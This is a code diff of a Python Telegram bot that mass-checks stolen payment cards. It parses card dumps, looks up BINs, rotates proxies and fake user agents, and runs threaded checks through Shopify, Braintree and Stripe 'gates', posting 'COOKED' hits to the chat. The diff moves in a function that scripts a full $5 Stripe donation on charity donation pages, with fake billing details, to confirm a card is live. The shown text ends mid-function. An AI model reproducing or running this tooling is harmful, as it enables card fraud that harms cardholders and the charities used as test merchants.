@@ -9,14 +9,13 @@ import os
 import urllib3
 import traceback
 import json
-import gates
 import user_agent
+import gates
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from telebot import types
 import autosh
 
 OWNER_ID = [5963548505, 1614278744]
-
 USER_PROXIES_FILE = "user_proxies.json"
 
 def load_user_proxies():
@@ -39,9 +38,7 @@ BINS_CSV_FILE = 'bins_all.csv'
 MAX_RETRIES = 2
 PROXY_TIMEOUT = 5
 BIN_DB = {}
-# Temporary storage for /stsite file content
-pending_stsite = {}
-
+pending_stsite = {}  # Temporary storage for /stsite file content
 
 def load_bin_database():
     global BIN_DB
@@ -66,7 +63,8 @@ def load_bin_database():
         logger.error(f"❌ Error loading BIN CSV: {e}")
 
 def get_flag_emoji(country_code):
-    if not country_code or len(country_code) != 2: return "🇺🇳"
+    if not country_code or len(country_code) != 2:
+        return "🇺🇳"
     return "".join([chr(ord(c.upper()) + 127397) for c in country_code])
 
 load_bin_database()
@@ -74,7 +72,8 @@ load_bin_database()
 def get_bin_info(card_number):
     clean_cc = re.sub(r'\D', '', str(card_number))
     bin_code = clean_cc[:6]
-    if bin_code in BIN_DB: return BIN_DB[bin_code]
+    if bin_code in BIN_DB:
+        return BIN_DB[bin_code]
     try:
         response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
         if response.status_code == 200:
@@ -87,8 +86,16 @@ def get_bin_info(card_number):
                 'level': data.get('level', 'Unknown'),
                 'bank': data.get('bank', 'Unknown')
             }
-    except: pass
-    return {'country_name': 'Unknown', 'country_flag': '🇺🇳', 'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'level': 'UNKNOWN'}
+    except:
+        pass
+    return {
+        'country_name': 'Unknown',
+        'country_flag': '🇺🇳',
+        'bank': 'UNKNOWN',
+        'brand': 'UNKNOWN',
+        'type': 'UNKNOWN',
+        'level': 'UNKNOWN'
+    }
 
 def extract_cards_from_text(text):
     valid_ccs = []
@@ -96,18 +103,21 @@ def extract_cards_from_text(text):
     lines = text.split('\n')
     for line in lines:
         line = line.strip()
-        if len(line) < 15: continue
+        if len(line) < 15:
+            continue
         match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
         if match:
             cc, mm, yyyy, cvv = match.groups()
-            if len(yyyy) == 2: yyyy = "20" + yyyy
+            if len(yyyy) == 2:
+                yyyy = "20" + yyyy
             mm = mm.zfill(2)
             if 1 <= int(mm) <= 12:
                 valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
     return list(set(valid_ccs))
 
 def create_progress_bar(processed, total, length=15):
-    if total == 0: return ""
+    if total == 0:
+        return ""
     percent = processed / total
     filled_length = int(length * percent)
     return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"
@@ -122,26 +132,36 @@ def validate_proxies_strict(proxies, bot, message):
     def check(proxy_str):
         try:
             parts = proxy_str.split(':')
-            if len(parts) == 2: url = f"http://{parts[0]}:{parts[1]}"
-            elif len(parts) == 4: url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            else: return False
+            if len(parts) == 2:
+                url = f"http://{parts[0]}:{parts[1]}"
+            elif len(parts) == 4:
+                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            else:
+                return False
             requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=PROXY_TIMEOUT)
             return True
-        except: return False
+        except:
+            return False
 
     with ThreadPoolExecutor(max_workers=50) as executor:
         futures = {executor.submit(check, p): p for p in proxies}
         for future in as_completed(futures):
             checked += 1
-            if future.result(): live_proxies.append(futures[future])
+            if future.result():
+                live_proxies.append(futures[future])
             if time.time() - last_ui_update > 2:
                 try:
-                    bot.edit_message_text(f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}", message.chat.id, status_msg.message_id, parse_mode='HTML')
+                    bot.edit_message_text(
+                        f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}",
+                        message.chat.id, status_msg.message_id, parse_mode='HTML'
+                    )
                     last_ui_update = time.time()
-                except: pass
-
-    try: bot.delete_message(message.chat.id, status_msg.message_id)
-    except: pass
+                except:
+                    pass
+    try:
+        bot.delete_message(message.chat.id, status_msg.message_id)
+    except:
+        pass
     return live_proxies
 
 # ============================================================================
@@ -203,6 +223,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                           process_response_func, update_stats_func, save_json_func,
                           is_user_allowed_func):
 
+    # ==========================================================================
+    # FILE UPLOAD HANDLER
+    # ==========================================================================
     @bot.message_handler(content_types=['document'])
     def handle_file_upload_event(message):
         if not is_user_allowed_func(message.from_user.id):
@@ -224,7 +247,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
             if ccs:
                 user_id = message.from_user.id
-                if user_id not in user_sessions: user_sessions[user_id] = {}
+                if user_id not in user_sessions:
+                    user_sessions[user_id] = {}
                 user_sessions[user_id]['ccs'] = ccs
                 user_sessions[user_id]['proxies'] = []
 
@@ -246,15 +270,22 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                 if proxies:
                     user_id = message.from_user.id
-                    if user_id not in user_sessions: user_sessions[user_id] = {}
+                    if user_id not in user_sessions:
+                        user_sessions[user_id] = {}
                     user_sessions[user_id]['proxies'] = proxies
-                    bot.edit_message_text(f"🔌 <b>Proxies Loaded:</b> {len(proxies)}\n✅ You can now run Mass Check.", message.chat.id, msg_loading.message_id, parse_mode='HTML')
+                    bot.edit_message_text(
+                        f"🔌 <b>Proxies Loaded:</b> {len(proxies)}\n✅ You can now run Mass Check.",
+                        message.chat.id, msg_loading.message_id, parse_mode='HTML'
+                    )
                 else:
                     bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)
 
         except Exception as e:
             bot.reply_to(message, f"❌ Error: {e}")
 
+    # ==========================================================================
+    # MASS CHECK COMMAND
+    # ==========================================================================
     @bot.message_handler(commands=['msh', 'hardcook'])
     def handle_mass_check_command(message):
         if not is_user_allowed_func(message.from_user.id):
@@ -301,7 +332,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         ).start()
 
     # ==========================================================================
-    # HELPER FUNCTIONS INSIDE SETUP_COMPLETE_HANDLER
+    # HELPER FUNCTIONS (must be defined before callbacks)
     # ==========================================================================
     def get_active_proxies(user_id):
         user_id = str(user_id)
@@ -315,8 +346,348 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 return proxies_data['proxies']
         return None
 
+    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
+        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
+        total = len(ccs)
+        processed = 0
+        start_time = time.time()
+        last_update_time = time.time()
+
+        def worker(cc):
+            attempts = 0
+            while attempts < MAX_RETRIES:
+                try:
+                    site = random.choice(sites)
+                    proxy = random.choice(proxies)
+                    api_response = check_site_func(site['url'], cc, proxy)
+
+                    if not api_response:
+                        attempts += 1
+                        continue
+
+                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))
+
+                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
+                        attempts += 1
+                        continue
+
+                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
+                except:
+                    attempts += 1
+            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}
+
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {executor.submit(worker, cc): cc for cc in ccs}
+            for future in as_completed(futures):
+                processed += 1
+                res = future.result()
+
+                if res['status'] == 'APPROVED':
+                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
+                        results['cooked'].append(res)
+                        update_stats_func('COOKED', True)
+                        send_hit(bot, message.chat.id, res, "🔥 COOKED")
+                    else:
+                        results['approved'].append(res)
+                        update_stats_func('APPROVED', True)
+                        send_hit(bot, message.chat.id, res, "✅ APPROVED")
+                elif res['status'] == 'APPROVED_OTP':
+                    results['approved'].append(res)
+                    update_stats_func('APPROVED_OTP', True)
+                    send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
+                elif res['status'] == 'DECLINED':
+                    results['declined'].append(res)
+                    update_stats_func('DECLINED', True)
+                else:
+                    results['error'].append(res)
+
+                if time.time() - last_update_time > 3 or processed == total:
+                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
+                    last_update_time = time.time()
+
+        duration = time.time() - start_time
+        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)
+
+    def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
+        total = len(ccs)
+        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
+
+        try:
+            status_msg = bot.send_message(
+                message.chat.id,
+                f"🔥 <b>{gate_name} Started...</b>\n"
+                f"💳 Cards: {total}\n"
+                f"🔌 Proxies: {len(proxies)}",
+                parse_mode='HTML'
+            )
+        except:
+            status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')
+
+        processed = 0
+        start_time = time.time()
+        last_update = time.time()
+
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = {}
+            for cc in ccs:
+                proxy = random.choice(proxies)
+                futures[executor.submit(gate_func, cc, proxy)] = cc
+
+            for future in as_completed(futures):
+                cc = futures[future]
+                processed += 1
+
+                try:
+                    response_text, status = future.result()
+
+                    res_obj = {
+                        'cc': cc,
+                        'response': response_text,
+                        'status': status,
+                        'gateway': gate_name,
+                        'price': 'N/A',
+                        'site_url': 'API'
+                    }
+
+                    if status == 'APPROVED':
+                        results['cooked'].append(res_obj)
+                        send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
+                    elif status == 'APPROVED_OTP':
+                        results['approved'].append(res_obj)
+                        send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
+                    elif status == 'DECLINED':
+                        results['declined'].append(res_obj)
+                    else:
+                        results['error'].append(res_obj)
+
+                    if time.time() - last_update > 3:
+                        msg = (
+                            f"⚡ <b>{gate_name} Checking...</b>\n"
+                            f"{create_progress_bar(processed, total)}\n"
+                            f"<b>Progress:</b> {processed}/{total}\n"
+                            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
+                            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
+                            f"⚠️ <b>Error:</b> {len(results['error'])}"
+                        )
+                        try:
+                            bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
+                            last_update = time.time()
+                        except:
+                            pass
+
+                except Exception as e:
+                    print(f"Check Error for {cc}: {e}")
+                    results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})
+
+        duration = time.time() - start_time
+        final_msg = (
+            f"✅ <b>{gate_name} Completed</b>\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"💳 <b>Total:</b> {total}\n"
+            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
+            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
+            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
+            f"⏱️ <b>Time:</b> {duration:.2f}s"
+        )
+
+        try:
+            bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
+        except:
+            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
+
+    # Helper for donation site testing (used in /stsite)
+    def test_donation_site_like_script(site_url, pk, cc, proxy=None):
+        """
+        Attempt a full donation on a site using the same flow as the working test script.
+        Returns "Charge ✅" if successful, otherwise the error/decline message.
+        """
+        try:
+            # Parse card
+            parts = re.split(r'[ |/]', cc)
+            if len(parts) < 4:
+                return "Invalid card format"
+            c, mm, ex, cvc = parts[0], parts[1], parts[2], parts[3]
+
+            # Process expiry year
+            try:
+                yy = ex[2] + ex[3]
+                if '2' in ex[3] or '1' in ex[3]:
+                    yy = ex[2] + '7'
+            except:
+                yy = ex[0] + ex[1]
+                if '2' in ex[1] or '1' in ex[1]:
+                    yy = ex[0] + '7'
+
+            session = requests.Session()
+            session.verify = False
+            if proxy:
+                formatted = gates.format_proxy(proxy)
+                if formatted:
+                    session.proxies = formatted
+
+            ua = user_agent.generate_user_agent()
+            headers = {'user-agent': ua}
+            donate_url = site_url if site_url.endswith('/donate') else site_url.rstrip('/') + '/donate/'
+
+            # Get donation page
+            r = session.get(donate_url, headers=headers, timeout=20)
+            time.sleep(3)
+
+            # Extract form data
+            ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
+            ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
+            ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
+
+            # First AJAX request to initiate donation
+            headers_ajax = {
+                'origin': site_url,
+                'referer': donate_url,
+                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'user-agent': ua,
+                'x-requested-with': 'XMLHttpRequest',
+            }
+            data_init = {
+                'give-honeypot': '',
+                'give-form-id-prefix': ssa00,
+                'give-form-id': ss000a00,
+                'give-form-title': 'Give a Donation',
+                'give-current-url': donate_url,
+                'give-form-url': donate_url,
+                'give-form-minimum': '5.00',
+                'give-form-maximum': '999999.99',
+                'give-form-hash': ssa,
+                'give-price-id': 'custom',
+                'give-amount': '5.00',
+                'give_tributes_type': 'DrGaM Of',
+                'give_tributes_show_dedication': 'no',
+                'give_tributes_radio_type': 'In Honor Of',
+                'give_tributes_first_name': '',
+                'give_tributes_last_name': '',
+                'give_tributes_would_to': 'send_mail_card',
+                'give-tributes-mail-card-personalized-message': '',
+                'give_tributes_mail_card_notify_first_name': '',
+                'give_tributes_mail_card_notify_last_name': '',
+                'give_tributes_address_country': 'US',
+                'give_tributes_mail_card_address_1': '',
+                'give_tributes_mail_card_address_2': '',
+                'give_tributes_mail_card_city': '',
+                'give_tributes_address_state': 'MI',
+                'give_tributes_mail_card_zipcode': '',
+                'give_stripe_payment_method': '',
+                'payment-mode': 'stripe',
+                'give_first': 'drgam ',
+                'give_last': 'drgam ',
+                'give_email': 'lolipnp@gmail.com',
+                'give_comment': '',
+                'card_name': 'drgam ',
+                'billing_country': 'US',
+                'card_address': 'drgam sj',
+                'card_address_2': '',
+                'card_city': 'tomrr',
+                'card_state': 'NY',
+                'card_zip': '10090',
+                'give_action': 'purchase',
+                'give-gateway': 'stripe',
+                'action': 'give_process_donation',
+                'give_ajax': 'true',
+            }
+            session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_init, timeout=20)
+
+            # Create Stripe payment method
+            stripe_headers = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'user-agent': ua,
+            }
+            stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
+            e = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
+            payment_id = e.json().get('id')
+            if not payment_id:
+                return "Failed to create payment method"
+
+            # Final donation submission
+            headers_final = {
+                'authority': site_url.replace('https://', ''),
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': site_url,
+                'referer': donate_url,
+                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'user-agent': ua,
+            }
+            params = {'payment-mode': 'stripe', 'form-id': ss000a00}
+            data_final = {
+                'give-honeypot': '',
+                'give-form-id-prefix': ssa00,
+                'give-form-id': ss000a00,
+                'give-form-title': 'Give a Donation',
+                'give-current-url': donate_url,
+                'give-form-url': donate_url,
+                'give-form-minimum': '5.00',
+                'give-form-maximum': '999999.99',
+                'give-form-hash': ssa,
+                'give-price-id': 'custom',
+                'give-amount': '5.00',
+                'give_tributes_type': 'In Honor Of',
+                'give_tributes_show_dedication': 'no',
+                'give_tributes_radio_type': 'Drgam Of',
+                'give_tributes_first_name': '',
+                'give_tributes_last_name': '',
+                'give_tributes_would_to': 'send_mail_card',
+                'give-tributes-mail-card-personalized-message': '',
+                'give_tributes_mail_card_notify_first_name': '',
+                'give_tributes_mail_card_notify_last_name': '',
+                'give_tributes_address_country': 'US',
+                'give_tributes_mail_card_address_1': '',
+                'give_tributes_mail_card_address_2': '',
+                'give_tributes_mail_card_city': '',
+                'give_tributes_address_state': 'MI',
+                'give_tributes_mail_card_zipcode': '',
+                'give_stripe_payment_method': payment_id,
+                'payment-mode': 'stripe',
+                'give_first': 'drgam ',
+                'give_last': 'drgam ',
+                'give_email': 'lolipnp@gmail.com',
+                'give_comment': '',
+                'card_name': 'drgam ',
+                'billing_country': 'US',
+                'card_address': 'drgam sj',
+                'card_address_2': '',
+                'card_city': 'tomrr',
+                'card_state': 'NY',
+                'card_zip': '10090',
+                'give_action': 'purchase',
+                'give-gateway': 'stripe',
+            }
+            r4 = session.post(donate_url, params=params, headers=headers_final, data=data_final, timeout=20)
+            text = r4.text
+            if 'Your card was declined.' in text:
+                return "card_declined"
+            elif 'Your card has insufficient funds.' in text:
+                return "insufficient_funds"
+            elif 'Thank you' in text or 'Thank you for your donation' in text or 'succeeded' in text or 'true' in text or 'success' in text:
+                return "Charge ✅"
+            elif 'Your card number is incorrect.' in text:
+                return "incorrect_CVV2"
+            else:
+                return "Card_reject"
+        except Exception as e:
+            return f"Error: {str(e)}"
+
     # ==========================================================================
-    # CALLBACK HANDLERS
+    # CALLBACK HANDLERS (now they see all helpers)
     # ==========================================================================
     @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
     def callback_shopify(call):
@@ -424,7 +795,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-                              
     @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree_mass")
     def callback_braintree_mass(call):
         try:
@@ -442,13 +812,13 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             process_mass_gate_check(
                 bot, call.message,
                 user_sessions[user_id]['ccs'],
-                gates.check_braintree_mass,   # the new function
+                gates.check_braintree_mass,
                 "Braintree Mass (bandc)",
                 proxies
             )
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
-        
+
     @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
     def callback_cancel(call):
         try:
@@ -457,8 +827,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-        # ============================================================================
-    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites (working version)
+    # ============================================================================
+    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites
     # ============================================================================
     @bot.message_handler(commands=['stsite'])
     def handle_stsite_command(message):
@@ -555,7 +925,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                         message.chat.id, status_msg.message_id
                     )
 
-                # Use the same logic as the working test script
+                # Use the helper function defined above
                 result = test_donation_site_like_script(url, pk, test_cc, proxy)
                 if result == "Charge ✅":
                     working.append(site)
@@ -604,346 +974,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
         bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
 
-# ----------------------------------------------------------------------------
-# Helper function that replicates the working test script's logic
-# ----------------------------------------------------------------------------
-def test_donation_site_like_script(site_url, pk, cc, proxy=None):
-    """
-    Attempt a full donation on a site using the same flow as the working test script.
-    Returns "Charge ✅" if successful, otherwise the error/decline message.
-    """
-    try:
-        # Parse card
-        parts = re.split(r'[ |/]', cc)
-        if len(parts) < 4:
-            return "Invalid card format"
-        c, mm, ex, cvc = parts[0], parts[1], parts[2], parts[3]
-
-        # Process expiry year (same as test script)
-        try:
-            yy = ex[2] + ex[3]
-            if '2' in ex[3] or '1' in ex[3]:
-                yy = ex[2] + '7'
-        except:
-            yy = ex[0] + ex[1]
-            if '2' in ex[1] or '1' in ex[1]:
-                yy = ex[0] + '7'
-
-        session = requests.Session()
-        session.verify = False
-        if proxy:
-            formatted = gates.format_proxy(proxy)
-            if formatted:
-                session.proxies = formatted
-
-        ua = user_agent.generate_user_agent()
-        headers = {'user-agent': ua}
-        donate_url = site_url if site_url.endswith('/donate') else site_url.rstrip('/') + '/donate/'
-
-        # Get donation page
-        r = session.get(donate_url, headers=headers, timeout=20)
-        time.sleep(3)
-
-        # Extract form data
-        ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
-        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
-        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
-
-        # First AJAX request to initiate donation
-        headers_ajax = {
-            'origin': site_url,
-            'referer': donate_url,
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'user-agent': ua,
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        data_init = {
-            'give-honeypot': '',
-            'give-form-id-prefix': ssa00,
-            'give-form-id': ss000a00,
-            'give-form-title': 'Give a Donation',
-            'give-current-url': donate_url,
-            'give-form-url': donate_url,
-            'give-form-minimum': '5.00',
-            'give-form-maximum': '999999.99',
-            'give-form-hash': ssa,
-            'give-price-id': 'custom',
-            'give-amount': '5.00',
-            'give_tributes_type': 'DrGaM Of',
-            'give_tributes_show_dedication': 'no',
-            'give_tributes_radio_type': 'In Honor Of',
-            'give_tributes_first_name': '',
-            'give_tributes_last_name': '',
-            'give_tributes_would_to': 'send_mail_card',
-            'give-tributes-mail-card-personalized-message': '',
-            'give_tributes_mail_card_notify_first_name': '',
-            'give_tributes_mail_card_notify_last_name': '',
-            'give_tributes_address_country': 'US',
-            'give_tributes_mail_card_address_1': '',
-            'give_tributes_mail_card_address_2': '',
-            'give_tributes_mail_card_city': '',
-            'give_tributes_address_state': 'MI',
-            'give_tributes_mail_card_zipcode': '',
-            'give_stripe_payment_method': '',
-            'payment-mode': 'stripe',
-            'give_first': 'drgam ',
-            'give_last': 'drgam ',
-            'give_email': 'lolipnp@gmail.com',
-            'give_comment': '',
-            'card_name': 'drgam ',
-            'billing_country': 'US',
-            'card_address': 'drgam sj',
-            'card_address_2': '',
-            'card_city': 'tomrr',
-            'card_state': 'NY',
-            'card_zip': '10090',
-            'give_action': 'purchase',
-            'give-gateway': 'stripe',
-            'action': 'give_process_donation',
-            'give_ajax': 'true',
-        }
-        session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_init, timeout=20)
-
-        # Create Stripe payment method
-        stripe_headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'user-agent': ua,
-        }
-        stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
-        e = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
-        payment_id = e.json().get('id')
-        if not payment_id:
-            return "Failed to create payment method"
-
-        # Final donation submission
-        headers_final = {
-            'authority': site_url.replace('https://', ''),
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': site_url,
-            'referer': donate_url,
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'user-agent': ua,
-        }
-        params = {'payment-mode': 'stripe', 'form-id': ss000a00}
-        data_final = {
-            'give-honeypot': '',
-            'give-form-id-prefix': ssa00,
-            'give-form-id': ss000a00,
-            'give-form-title': 'Give a Donation',
-            'give-current-url': donate_url,
-            'give-form-url': donate_url,
-            'give-form-minimum': '5.00',
-            'give-form-maximum': '999999.99',
-            'give-form-hash': ssa,
-            'give-price-id': 'custom',
-            'give-amount': '5.00',
-            'give_tributes_type': 'In Honor Of',
-            'give_tributes_show_dedication': 'no',
-            'give_tributes_radio_type': 'Drgam Of',
-            'give_tributes_first_name': '',
-            'give_tributes_last_name': '',
-            'give_tributes_would_to': 'send_mail_card',
-            'give-tributes-mail-card-personalized-message': '',
-            'give_tributes_mail_card_notify_first_name': '',
-            'give_tributes_mail_card_notify_last_name': '',
-            'give_tributes_address_country': 'US',
-            'give_tributes_mail_card_address_1': '',
-            'give_tributes_mail_card_address_2': '',
-            'give_tributes_mail_card_city': '',
-            'give_tributes_address_state': 'MI',
-            'give_tributes_mail_card_zipcode': '',
-            'give_stripe_payment_method': payment_id,
-            'payment-mode': 'stripe',
-            'give_first': 'drgam ',
-            'give_last': 'drgam ',
-            'give_email': 'lolipnp@gmail.com',
-            'give_comment': '',
-            'card_name': 'drgam ',
-            'billing_country': 'US',
-            'card_address': 'drgam sj',
-            'card_address_2': '',
-            'card_city': 'tomrr',
-            'card_state': 'NY',
-            'card_zip': '10090',
-            'give_action': 'purchase',
-            'give-gateway': 'stripe',
-        }
-        r4 = session.post(donate_url, params=params, headers=headers_final, data=data_final, timeout=20)
-        text = r4.text
-        if 'Your card was declined.' in text:
-            return "card_declined"
-        elif 'Your card has insufficient funds.' in text:
-            return "insufficient_funds"
-        elif 'Thank you' in text or 'Thank you for your donation' in text or 'succeeded' in text or 'true' in text or 'success' in text:
-            return "Charge ✅"
-        elif 'Your card number is incorrect.' in text:
-            return "incorrect_CVV2"
-        else:
-            return "Card_reject"
-    except Exception as e:
-        return f"Error: {str(e)}"
-    # ============================================================================
-    # 🧠 MASS CHECK ENGINE
-    # ============================================================================
-    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
-        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
-        total = len(ccs)
-        processed = 0
-        start_time = time.time()
-        last_update_time = time.time()
-
-        def worker(cc):
-            attempts = 0
-            while attempts < MAX_RETRIES:
-                try:
-                    site = random.choice(sites)
-                    proxy = random.choice(proxies)
-                    api_response = check_site_func(site['url'], cc, proxy)
-
-                    if not api_response:
-                        attempts += 1; continue
-
-                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))
-
